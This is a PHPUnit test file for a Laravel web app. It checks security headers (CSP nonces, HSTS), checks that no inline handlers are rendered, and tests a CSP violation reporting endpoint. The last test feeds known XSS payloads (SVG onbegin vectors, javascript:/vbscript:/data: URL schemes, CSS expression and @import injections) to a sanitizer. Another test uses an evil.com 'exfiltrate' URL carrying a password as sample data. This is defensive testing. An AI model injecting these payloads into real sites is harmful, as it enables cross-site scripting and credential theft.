<?php

namespace Tests\Feature;

use App\Models\Admin;
use App\Models\FooterSetting;
use App\Support\RichTextSanitizer;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\RateLimiter;
use Tests\TestCase;

class BrowserSecurityHardeningTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();
        RateLimiter::clear('csp-report:127.0.0.1');
    }

    public function test_csp_header_enforces_nonce_and_removes_unsafe_inline_from_scripts(): void
    {
        $response = $this->get('/');

        $response->assertStatus(200);
        $response->assertHeader('Content-Security-Policy');

        $csp = (string) $response->headers->get('Content-Security-Policy');

        // script-src must have nonce and must NOT allow unsafe-inline or unsafe-eval
        $this->assertMatchesRegularExpression("/script-src 'self' 'nonce-[A-Za-z0-9+\/]+=*'/", $csp);
        $this->assertStringNotContainsString("script-src 'self' 'unsafe-inline'", $csp);
        $this->assertStringNotContainsString("'unsafe-eval'", $csp);

        // Required defensive directives
        $this->assertStringContainsString("object-src 'none'", $csp);
        $this->assertStringContainsString("base-uri 'self'", $csp);
        $this->assertStringContainsString("form-action 'self'", $csp);
        $this->assertStringContainsString("frame-ancestors 'self'", $csp);
        $this->assertStringContainsString("report-uri /api/csp-report", $csp);
        $this->assertStringContainsString("report-to csp-endpoint", $csp);

        // Modern Reporting-Endpoints header
        $response->assertHeader('Reporting-Endpoints');
        $this->assertStringContainsString('csp-endpoint=', (string) $response->headers->get('Reporting-Endpoints'));

        // Standard defensive headers
        $response->assertHeader('X-Frame-Options', 'SAMEORIGIN');
        $response->assertHeader('X-Content-Type-Options', 'nosniff');
        $response->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->assertHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    }

    public function test_csp_nonce_is_unique_per_request(): void
    {
        $response1 = $this->get('/');
        $response2 = $this->get('/');

        $csp1 = (string) $response1->headers->get('Content-Security-Policy');
        $csp2 = (string) $response2->headers->get('Content-Security-Policy');

        preg_match("/'nonce-([A-Za-z0-9+\/]+=*)'/", $csp1, $matches1);
        preg_match("/'nonce-([A-Za-z0-9+\/]+=*)'/", $csp2, $matches2);

        $this->assertNotEmpty($matches1[1] ?? null);
        $this->assertNotEmpty($matches2[1] ?? null);
        $this->assertNotSame($matches1[1], $matches2[1]);
    }

    public function test_csp_report_only_mode_can_be_enabled_via_configuration(): void
    {
        config(['security.csp.report_only' => true]);

        $response = $this->get('/');

        $response->assertStatus(200);
        $response->assertHeader('Content-Security-Policy-Report-Only');
        $this->assertFalse($response->headers->has('Content-Security-Policy'));

        $csp = (string) $response->headers->get('Content-Security-Policy-Report-Only');
        $this->assertMatchesRegularExpression("/script-src 'self' 'nonce-[A-Za-z0-9+\/]+=*'/", $csp);
        $this->assertStringNotContainsString("'unsafe-eval'", $csp);
    }

    public function test_hsts_header_is_only_sent_over_https_and_respects_subdomain_configuration(): void
    {
        // 1. Insecure HTTP request -> Strict-Transport-Security MUST NOT be sent
        $insecureResponse = $this->get('http://localhost/');
        $this->assertFalse($insecureResponse->headers->has('Strict-Transport-Security'));

        // 2. Secure HTTPS request -> Strict-Transport-Security is sent with default max-age
        $secureResponse = $this->get('https://localhost/');
        $secureResponse->assertHeader('Strict-Transport-Security');
        $hsts = (string) $secureResponse->headers->get('Strict-Transport-Security');
        $this->assertStringContainsString('max-age=31536000', $hsts);
        // By default, includeSubDomains and preload are disabled for subdomain safety
        $this->assertStringNotContainsString('includeSubDomains', $hsts);
        $this->assertStringNotContainsString('preload', $hsts);

        // 3. When explicitly configured, includeSubDomains and preload are included
        config([
            'security.hsts.include_subdomains' => true,
            'security.hsts.preload' => true,
        ]);

        $configuredResponse = $this->get('https://localhost/');
        $configuredHsts = (string) $configuredResponse->headers->get('Strict-Transport-Security');
        $this->assertStringContainsString('includeSubDomains', $configuredHsts);
        $this->assertStringContainsString('preload', $configuredHsts);
    }

    public function test_lottie_player_is_self_hosted_and_matches_original_timing_and_asset(): void
    {
        // 1. Self-hosted library file exists on disk
        $localLottiePath = public_path('vendor/lottie/lottie.min.js');
        $this->assertFileExists($localLottiePath);
        $this->assertGreaterThan(100000, filesize($localLottiePath));

        // 2. Animation JSON exists
        $animationPath = public_path('animations/loading-animation.json');
        $this->assertFileExists($animationPath);

        // 3. Rendered homepage includes self-hosted lottie script with CSP nonce
        $response = $this->get('/');
        $response->assertStatus(200);
        $content = $response->getContent();

        $this->assertStringContainsString('vendor/lottie/lottie.min.js', $content);
        $this->assertStringContainsString('animations/loading-animation.json', $content);
        // Timing constants preserved
        $this->assertStringContainsString('140 - elapsed', $content);
        $this->assertStringContainsString('loaderAnimation.setSpeed(1.9)', $content);
        $this->assertStringContainsString('window.setTimeout(hideLoader, 700)', $content);
    }

    public function test_all_rendered_script_tags_contain_matching_csp_nonce(): void
    {
        $urls = [
            '/',
            '/login',
            '/faq',
            '/gallery',
            '/shareholder-reviews',
            '/valued-shareholders',
            '/terms-and-conditions',
        ];

        foreach ($urls as $url) {
            $response = $this->get($url);
            $response->assertStatus(200);

            $csp = (string) $response->headers->get('Content-Security-Policy');
            preg_match("/'nonce-([A-Za-z0-9+\/]+=*)'/", $csp, $nonceMatches);
            $expectedNonce = $nonceMatches[1] ?? '';
            $this->assertNotEmpty($expectedNonce, "No CSP nonce found in header for {$url}");

            $content = $response->getContent();

            // Extract all <script ...> tags (excluding end tags)
            preg_match_all('/<script\b([^>]*)>/i', $content, $scriptTags);

            foreach ($scriptTags[1] as $tagAttributes) {
                // Every script tag must have nonce="{expectedNonce}"
                $this->assertMatchesRegularExpression(
                    '/nonce=["\']' . preg_quote($expectedNonce, '/') . '["\']/',
                    $tagAttributes,
                    "Script tag on {$url} lacks expected CSP nonce: <script{$tagAttributes}>"
                );
            }
        }
    }

    public function test_all_inline_event_handlers_are_removed_from_rendered_html(): void
    {
        $urls = [
            '/',
            '/login',
            '/faq',
            '/gallery',
            '/shareholder-reviews',
            '/valued-shareholders',
            '/terms-and-conditions',
        ];

        foreach ($urls as $url) {
            $response = $this->get($url);
            $response->assertStatus(200);
            $content = $response->getContent();

            // Match any on* attributes in HTML tags (e.g. onclick="...", onerror="...", onload="...")
            // Exclude inside <script> blocks
            $htmlWithoutScripts = preg_replace('/<script\b[^>]*>.*?<\/script>/is', '', $content);

            $this->assertDoesNotMatchRegularExpression(
                '/\b(on[a-z]+)\s*=\s*["\'][^"\']*["\']/i',
                $htmlWithoutScripts,
                "Found prohibited inline event handler in rendered HTML on {$url}"
            );
        }
    }

    public function test_csp_reporting_endpoint_accepts_and_logs_valid_reports(): void
    {
        Log::shouldReceive('warning')
            ->once()
            ->with('CSP violation reported', \Mockery::on(function ($context) {
                return isset($context['report']['blocked_uri'])
                    && $context['report']['blocked_uri'] === 'inline'
                    && isset($context['report']['violated_directive'])
                    && $context['report']['violated_directive'] === 'script-src';
            }));

        $reportPayload = [
            'csp-report' => [
                'document-uri' => 'https://kinglotusgroup.com/',
                'referrer' => '',
                'violated-directive' => 'script-src',
                'effective-directive' => 'script-src',
                'original-policy' => "default-src 'self'",
                'disposition' => 'enforce',
                'blocked-uri' => 'inline',
                'line-number' => 42,
                'column-number' => 10,
                'source-file' => 'https://kinglotusgroup.com/',
                'status-code' => 200,
            ],
        ];

        $response = $this->postJson('/api/csp-report', $reportPayload);
        $response->assertStatus(204);
    }

    public function test_csp_reporting_endpoint_accepts_reporting_api_json(): void
    {
        Log::shouldReceive('warning')
            ->once()
            ->with('CSP violation reported', \Mockery::on(function ($context) {
                return isset($context['report']['effective_directive'])
                    && $context['report']['effective_directive'] === 'img-src';
            }));

        $reportingApiPayload = [
            [
                'type' => 'csp-violation',
                'age' => 5,
                'url' => 'https://kinglotusgroup.com/',
                'user_agent' => 'Mozilla/5.0',
                'body' => [
                    'documentURL' => 'https://kinglotusgroup.com/',
                    'referrer' => '',
                    'blockedURL' => 'http://evil.com/tracker.png',
                    'effectiveDirective' => 'img-src',
                    'originalPolicy' => "default-src 'self'",
                    'disposition' => 'report',
                    'statusCode' => 200,
                    'lineNumber' => 10,
                    'columnNumber' => 20,
                ],
            ],
        ];

        $response = $this->postJson('/api/csp-report', $reportingApiPayload);
        $response->assertStatus(204);
    }

    public function test_csp_reporting_endpoint_redacts_sensitive_parameters(): void
    {
        Log::shouldReceive('warning')
            ->once()
            ->with('CSP violation reported', \Mockery::on(function ($context) {
                $docUri = $context['report']['document_uri'] ?? '';
                $blockedUri = $context['report']['blocked_uri'] ?? '';

                return str_contains($docUri, 'token=[REDACTED]')
                    && ! str_contains($docUri, 'supersecrettoken123')
                    && str_contains($blockedUri, 'password=[REDACTED]')
                    && ! str_contains($blockedUri, 'SuperSecretPass!');
            }));

        $reportPayload = [
            'csp-report' => [
                'document-uri' => 'https://kinglotusgroup.com/reset-password?token=supersecrettoken123&email=test@example.com',
                'blocked-uri' => 'https://evil.com/exfiltrate?password=SuperSecretPass!&user=admin',
                'violated-directive' => 'connect-src',
                'status-code' => 200,
            ],
        ];

        $response = $this->postJson('/api/csp-report', $reportPayload);
        $response->assertStatus(204);
    }

    public function test_csp_reporting_endpoint_rejects_oversized_payloads(): void
    {
        $oversizedData = [
            'csp-report' => [
                'document-uri' => 'https://kinglotusgroup.com/',
                'bloat' => str_repeat('A', 35000), // > 32KB
            ],
        ];

        $response = $this->call(
            'POST',
            '/api/csp-report',
            [],
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode($oversizedData)
        );

        $response->assertStatus(413);
    }

    public function test_csp_reporting_endpoint_rejects_malformed_json_and_invalid_structures(): void
    {
        // Malformed JSON
        $response1 = $this->call(
            'POST',
            '/api/csp-report',
            [],
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            '{invalid json'
        );
        $response1->assertStatus(400);

        // Valid JSON but non-CSP structure
        $response2 = $this->postJson('/api/csp-report', [
            'random_key' => 'random_value',
        ]);
        $response2->assertStatus(422);
    }

    public function test_csp_reporting_endpoint_is_rate_limited(): void
    {
        $validReport = [
            'csp-report' => [
                'document-uri' => 'https://kinglotusgroup.com/',
                'violated-directive' => 'script-src',
                'blocked-uri' => 'inline',
            ],
        ];

        for ($i = 0; $i < 60; $i++) {
            RateLimiter::hit('csp-report:127.0.0.1', 60);
        }

        $response = $this->postJson('/api/csp-report', $validReport);
        $response->assertStatus(429);
        $response->assertJson(['error' => 'Too many reports']);
    }

    public function test_production_vite_build_does_not_generate_public_source_maps(): void
    {
        $buildAssetsDir = public_path('build/assets');

        if (File::isDirectory($buildAssetsDir)) {
            $mapFiles = File::glob($buildAssetsDir . '/*.map');
            $this->assertEmpty($mapFiles, 'Found public source maps in build assets directory!');
        }

        $viteConfig = File::get(base_path('vite.config.js'));
        $this->assertStringContainsString('sourcemap: false', $viteConfig);
    }

    public function test_adversarial_xss_svg_malicious_urls_and_css_injections(): void
    {
        // 1. Advanced SVG Vectors
        $svgPayloads = [
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><set onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>',
            '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>',
            '<svg><a xlink:href="javascript:alert(1)"><circle r="10"/></a></svg>',
        ];

        foreach ($svgPayloads as $payload) {
            $sanitized = RichTextSanitizer::sanitize($payload);
            $this->assertTrue(
                $sanitized === null || ! str_contains($sanitized, 'alert') && ! str_contains($sanitized, '<svg') && ! str_contains($sanitized, '<script'),
                "SVG vector was not safely sanitized: {$payload}"
            );
        }

        // 2. Encoded / Obfuscated JavaScript Schemes in href
        $schemePayloads = [
            '<a href="javascript:alert(1)">click</a>',
            '<a href="JAVASCRIPT:alert(1)">click</a>',
            '<a href="  javascript:alert(1)">click</a>',
            '<a href="jav&#x09;ascript:alert(1)">click</a>',
            '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
            '<a href="vbscript:msgbox(1)">click</a>',
            '<a href="//evil.com/phish">click</a>',
            '<a href="/\evil.com">click</a>',
        ];

        foreach ($schemePayloads as $payload) {
            $sanitized = RichTextSanitizer::sanitize($payload);
            $this->assertTrue(
                $sanitized === null || (! str_contains($sanitized, 'href="javascript') && ! str_contains($sanitized, 'href="//') && ! str_contains($sanitized, 'href="data:') && ! str_contains($sanitized, 'href="vbscript:')),
                "Malicious URL scheme was not removed: {$payload}"
            );
        }

        // 3. CSS Injections and Expression Vectors
        $cssPayloads = [
            'color: red; background: url("javascript:alert(1)");',
            'width: expression(alert(1));',
            'behavior: url(xss.htc);',
            '-moz-binding: url(xss.xml#test);',
            '@import "http://evil.com/xss.css";',
            'font-family: "</style><script>alert(1)</script>";',
        ];

        foreach ($cssPayloads as $css) {
            $sanitizedCss = RichTextSanitizer::sanitizeStyleAttribute($css);
            $this->assertTrue(
                $sanitizedCss === null || (! str_contains($sanitizedCss, 'javascript') && ! str_contains($sanitizedCss, 'expression') && ! str_contains($sanitizedCss, 'behavior') && ! str_contains($sanitizedCss, '@import') && ! str_contains($sanitizedCss, '<script')),
                "CSS injection vector was not blocked: {$css}"
            );
        }
    }
}
